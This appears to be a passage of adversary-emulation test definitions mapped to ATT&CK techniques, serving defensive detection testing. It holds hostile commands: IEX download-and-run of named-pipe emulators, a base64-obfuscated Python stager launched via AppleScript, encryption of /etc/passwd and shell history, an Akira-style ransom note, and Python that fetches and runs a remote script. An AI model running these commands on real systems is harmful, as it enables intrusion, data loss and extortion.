				"description": "Specify target hostname",
				"type": "string",
				"default": "google.com"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires telnet\n",
				"prereq_command": "which telnet\n",
				"get_prereq_command": "echo \"please install telnet to run this test\"; exit 1\n"
			}
		],
		"executor": {
			"command": "echo quit | telnet #{domain} #{port}\nexit 0\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1571",
		"phases": ["command-and-control"]
	},
	{
		"name": "Cobalt Strike Artifact Kit pipe",
		"auto_generated_guid": "bd13b9fc-b758-496a-b81a-397462f82c72",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Named pipe executors must exist on disk\n",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1559",
		"phases": ["execution"]
	},
	{
		"name": "Cobalt Strike Lateral Movement (psexec_psh) pipe",
		"auto_generated_guid": "830c8b6c-7a70-4f40-b975-8bbe74558acd",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Named pipe executors must exist on disk\n",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 2\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1559",
		"phases": ["execution"]
	},
	{
		"name": "Cobalt Strike SSH (postex_ssh) pipe",
		"auto_generated_guid": "d1f72fa0-5bc2-4b4b-bd1e-43b6e8cfb2e6",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Named pipe executors must exist on disk\n",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 3\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1559",
		"phases": ["execution"]
	},
	{
		"name": "Cobalt Strike post-exploitation pipe (4.2 and later)",
		"auto_generated_guid": "7a48f482-246f-4aeb-9837-21c271ebf244",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Named pipe executors must exist on disk\n",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1559",
		"phases": ["execution"]
	},
	{
		"name": "Cobalt Strike post-exploitation pipe (before 4.2)",
		"auto_generated_guid": "8dbfc15c-527b-4ab0-a272-019f469d367f",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Named pipe executors must exist on disk\n",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (\"Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1559",
		"phases": ["execution"]
	},
	{
		"name": "AppleScript",
		"auto_generated_guid": "3600d97d-81b9-4171-ab96-e4386506e2c2",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1059.002",
		"phases": ["execution"]
	},
	{
		"name": "Encrypt files using gpg (FreeBSD/Linux)",
		"auto_generated_guid": "7b8ce084-3922-4618-8d22-95f996173765",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"pwd_for_encrypted_file": {
				"description": "the password that you want for the encrypted file",
				"type": "string",
				"default": "passwd"
			},
			"encrypted_file_path": {
				"description": "path to the encrypted file",
				"type": "path",
				"default": "/tmp/passwd.gpg"
			},
			"input_file_path": {
				"description": "path to the file that you want to encrypt",
				"type": "path",
				"default": "/etc/passwd"
			},
			"encryption_alg": {
				"description": "encryption algorithm of the file",
				"type": "string",
				"default": "AES-256"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Finds where gpg is located\n",
				"prereq_command": "which_gpg=`which gpg`\n",
				"get_prereq_command": "(which pkg && pkg install -y gnupg)||(which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "echo \"#{pwd_for_encrypted_file}\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}\n",
			"cleanup_command": "rm #{encrypted_file_path}\n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Encrypt files using 7z (FreeBSD/Linux)",
		"auto_generated_guid": "53e6735a-4727-44cc-b35b-237682a151ad",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"pwd_for_encrypted_file": {
				"description": "the password that you want for the encrypted file",
				"type": "string",
				"default": "passwd"
			},
			"encrypted_file_path": {
				"description": "path to the encrypted file",
				"type": "path",
				"default": "/tmp/passwd.zip"
			},
			"input_file_path": {
				"description": "path to the file that you want to encrypt",
				"type": "path",
				"default": "/etc/passwd"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Finds where 7z is located\n",
				"prereq_command": "which_7z=`which 7z`\n",
				"get_prereq_command": "(which pkg && pkg install -y 7-zip)\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n",
			"cleanup_command": "$which_7z e #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Encrypt files using ccrypt (FreeBSD/Linux)",
		"auto_generated_guid": "08cbf59f-85da-4369-a5f4-049cffd7709f",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"cped_file_path": {
				"description": "path where you want your copied file to be",
				"type": "path",
				"default": "/tmp/passwd"
			},
			"root_input_file_path": {
				"description": "path to the file that you want to be encrypted if you are root user",
				"type": "path",
				"default": "/etc/passwd"
			},
			"user_input_file_path": {
				"description": "path to file that you want to be encrypted if you are normal user",
				"type": "path",
				"default": "~/.bash_history"
			},
			"impact_command": {
				"description": "command to show impact of encryption",
				"type": "string",
				"default": "sudo su"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Finds where ccencrypt and ccdecrypt is located and copies input file\n",
				"prereq_command": "which_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\nif [ $USER == \"root\" ]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi\n",
				"get_prereq_command": "(which pkg && pkg install -y ccript)||(which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "if [ $USER == \"root\" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi\n",
			"cleanup_command": "if [ $USER == \"root\" ]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi \n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Encrypt files using openssl (FreeBSD/Linux)",
		"auto_generated_guid": "142752dc-ca71-443b-9359-cf6f497315f1",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"private_key_path": {
				"description": "path to the private key",
				"type": "path",
				"default": "/tmp/key.pem"
			},
			"public_key_path": {
				"description": "path to the public key",
				"type": "path",
				"default": "/tmp/pub.pem"
			},
			"encryption_bit_size": {
				"description": "size of the bit of encryption",
				"type": "integer",
				"default": 2048
			},
			"encrypted_file_path": {
				"description": "path to the encrypted file",
				"type": "path",
				"default": "/tmp/passwd.zip"
			},
			"input_file_path": {
				"description": "path to the file that you want to encrypt",
				"type": "path",
				"default": "/etc/passwd"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Finds where openssl is located\n",
				"prereq_command": "which_openssl=`which openssl`\n",
				"get_prereq_command": ""
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n",
			"cleanup_command": "$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "PureLocker Ransom Note",
		"auto_generated_guid": "649349c7-9abf-493b-a7a2-b1aa4d141528",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n",
			"cleanup_command": "del %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1\n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Encrypt files using 7z utility - macOS",
		"auto_generated_guid": "645f0f5a-ef09-48d8-b9bc-f0e24c642d72",
		"supported_platforms": ["macos"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if 7z command exists on the machine\n",
				"prereq_command": "which 7z\n",
				"get_prereq_command": "echo Installing 7z, using brew\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\nbrew install p7zip\n"
			}
		],
		"input_arguments": {
			"file_password": {
				"description": "Password to be provided for archiving the file",
				"type": "string",
				"default": "ARTPass"
			},
			"encrypted_file_name": {
				"description": "Name of the archive to be created",
				"type": "string",
				"default": "ARTArchive.7z"
			},
			"input_file_path": {
				"description": "Path to the file that you want to encrypt",
				"type": "path",
				"default": "~/test.txt"
			}
		},
		"executor": {
			"command": "7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}\n",
			"cleanup_command": "rm #{encrypted_file_name}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Encrypt files using openssl utility - macOS",
		"auto_generated_guid": "1a01f6b8-b1e8-418e-bbe3-78a6f822759e",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"encryption_option": {
				"description": "Specifiy the required encryption option",
				"type": "string",
				"default": "-pbkdf2"
			},
			"input_file_path": {
				"description": "Path to the file that you want to encrypt",
				"type": "path",
				"default": "~/test.txt"
			},
			"output_file_name": {
				"description": "Path to the file that you want to encrypt",
				"type": "string",
				"default": "ARTFile"
			}
		},
		"executor": {
			"command": "openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}\n",
			"cleanup_command": "rm #{output_file_name}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Data Encrypted with GPG4Win",
		"auto_generated_guid": "4541e2c2-33c8-44b1-be79-9161440f1718",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"GPG_Exe_Location": {
				"description": "Path of the GPG program",
				"type": "path",
				"default": "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe"
			},
			"File_to_Encrypt_Location": {
				"description": "Path of File",
				"type": "path",
				"default": "$env:temp\\test.txt"
			}
		},
		"dependencies": [
			{
				"description": "GPG must exist at (#{GPG_Exe_Location})\n",
				"prereq_command": "if (test-path '#{GPG_Exe_Location}'){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://files.gpg4win.org/gpg4win-4.1.0.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\" /S\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "cmd /c '#{GPG_Exe_Location}' -c '#{File_to_Encrypt_Location}'\n",
			"cleanup_command": "remove-item '#{File_to_Encrypt_Location}.gpg' -force -erroraction silentlycontinue | out-null\n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Data Encrypt Using DiskCryptor",
		"auto_generated_guid": "44b68e11-9da2-4d45-a0d9-893dabd60f30",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dcrypt_exe": {
				"description": "The dcrypt.exe executable from dcrypt_setup.exe",
				"type": "path",
				"default": "dcrypt.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "dcrypt_setup will be installed at specified location (#{dcrypt_exe})\n",
				"prereq_command": "if (Test-Path \"${env:ProgramFiles}/dcrypt/#{dcrypt_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Downloading DiskCryptor installer\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe\" -OutFile      \"PathToAtomicsFolder\\..\\ExternalPayloads\\dcrypt_setup_1.1.846.118.exe\"\nWrite-Host Install DiskCryptor\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\dcrypt_setup_1.1.846.118.exe\" -Wait -ArgumentList \"/s\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "\"\"%PROGRAMFILES%\\dcrypt\"\\#{dcrypt_exe}\"\n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Akira Ransomware drop Files with .akira Extension and Ransomnote",
		"auto_generated_guid": "ab3f793f-2dcc-4da5-9c71-34988307263f",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes(\"c:\\test.$_.akira\", $out) }\necho \"Hi friends\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption  Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: \" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them \u2014 in this case we won't be able to help.  \" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes \u2014 generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Then all of this will be published in our blog -\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"https://akira.onion\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"2. Paste this link \u2014 https://akira.onion\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"3. Use this code - - to log into our chat.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Keep in mind that the faster you will get in touch, the less damage we cause\" >> $env:Userprofile\\Desktop\\akira_readme.txt\n",
			"cleanup_command": "del $env:Userprofile\\Desktop\\akira_readme.txt \ndel c:\\test.*.akira\n"
		},
		"attack_technique": "T1486",
		"phases": ["impact"]
	},
	{
		"name": "Execute shell script via python's command mode arguement",
		"auto_generated_guid": "3a95cdb2-c6ea-4761-b24e-02b71889b8bb",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"script_url": {
				"description": "Shell script public URL",
				"type": "string",
				"default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
			},
			"payload_file_name": {
				"description": "Name of shell script downloaded from the script_url",
				"type": "string",
				"default": "T1059.006-payload"
			},
			"executor": {
				"description": "FreeBSD or Linux shell",
				"type": "string",
				"default": "sh"
			},
			"script_args": {
				"description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
				"type": "string",
				"default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify if python is in the environment variable path and attempt to import requests library.",
				"prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
				"get_prereq_command": "pip install requests\n"
			}
		],
		"executor": {
			"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
			"name": "sh",
			"cleanup_command": "rm #{payload_file_name} \npip-autoremove pypykatz >nul 2> nul\n",
			"elevation_required": false
		},
		"attack_technique": "T1059.006",
		"phases": ["execution"]
	},
	{
		"name": "Execute Python via scripts",
		"auto_generated_guid": "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"python_script_name": {
				"description": "Python script name",
				"type": "path",
				"default": "T1059.006.py"
			},
			"script_url": {
				"description": "Shell script public URL",
				"type": "string",
				"default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
			},
			"payload_file_name": {
				"description": "Shell script file name downloaded from the script_url",
				"type": "string",
				"default": "T1059.006-payload"
			},
			"executor": {
				"description": "Payload or script interpreter / executor",
				"type": "string",
				"default": "sh"
			},
			"script_args": {
				"description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
				"type": "string",
				"default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires Python\n",
				"prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
				"get_prereq_command": "pip install requests    \n"
			}
		],
		"executor": {
			"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python #{python_script_name}\n",
			"name": "sh",
			"cleanup_command": "rm #{python_script_name} #{payload_file_name}  \n",
			"elevation_required": false
		},
		"attack_technique": "T1059.006",
		"phases": ["execution"]
	},
	{
		"name": "Execute Python via Python executables",
		"auto_generated_guid": "0b44d79b-570a-4b27-a31f-3bf2156e5eaa",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"python_script_name": {
				"description": "Name of Python script name",
				"type": "path",
				"default": "T1059.006.py"
			},
			"script_url": {
				"description": "URL hosting external malicious payload",
				"type": "string",
				"default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
			},
			"payload_file_name": {
				"description": "Shell script file name downloaded from the script_url",
				"type": "string",
				"default": "T1059.006-payload"
			},
			"executor": {
				"description": "Payload or script interpreter / executor",
				"type": "string",
				"default": "sh"
			},
			"script_args": {
				"description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
				"type": "string",
				"default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
			},
			"python_binary_name": {
				"description": "Name of Python file to be compiled",
				"type": "path",
				"default": "T1059.006.pyc"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires Python\n",
				"prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
				"get_prereq_command": "pip install requests    \n"
			}
		],
		"executor": {
